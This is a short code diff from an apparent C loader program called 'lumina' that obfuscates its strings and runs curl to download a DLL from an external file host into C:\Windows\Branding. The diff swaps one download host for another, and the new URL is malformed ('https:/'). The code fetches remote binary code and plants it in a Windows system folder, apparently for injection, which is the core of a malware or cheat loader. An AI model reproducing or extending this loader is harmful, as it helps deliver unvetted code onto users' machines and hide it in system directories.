@@ -201,7 +201,7 @@ int main() {
         system(X("cls"));
 
         printf(X("[ lumina ] Downloading DLL from server...\n"));
-        int result = system(X("curl -s https://files.catbox.moe/qouiw7.dll -o C:\\Windows\\Branding\\lumina.dll"));
+        int result = system(X("curl -s https:/huntiez.xyz/assets/lumina.dll -o C:\\Windows\\Branding\\lumina.dll"));
         if (result != 0) {
             printf(X("[ lumina ] Failed to download DLL.\n"));
             system(X("pause"));
